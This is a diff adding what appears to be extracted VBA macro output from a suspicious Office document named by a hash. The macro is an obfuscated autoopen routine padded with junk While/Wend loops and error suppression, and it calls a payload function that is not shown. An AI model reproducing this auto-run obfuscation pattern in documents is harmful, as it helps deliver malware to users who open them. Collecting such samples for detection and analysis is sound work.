@@ -1,0 +1,30 @@
+Filename     : ./macros/f13b6d9e53bb9bb275aa55fd2a5911ea26b563695c8b53e5accc7ed98d8537ff
+OLE stream   : Macros/VBA/P324_802
+VBA filename : P324_802.bas
+----------------------------------------
+Attribute VB_Name = "P324_802"
+Function r3073_(X977412)
+         While b24440 And 459520417
+      Wend
+         While a5_45897 And 532484408
+      Wend
+Set r3073_ = CVar(X977412)
+         While n050064 And 376973578
+      Wend
+         While W12396 And 576509845
+      Wend
+End Function
+Sub _
+autoopen()
+On Error Resume Next
+         While U_92588 And 17703731
+      Wend
+         While i08528 And 552808729
+      Wend
+Call K_657609
+         While P001748 And 239949978
+      Wend
+         While s675_4 And 796560502
+      Wend
+End Sub
+
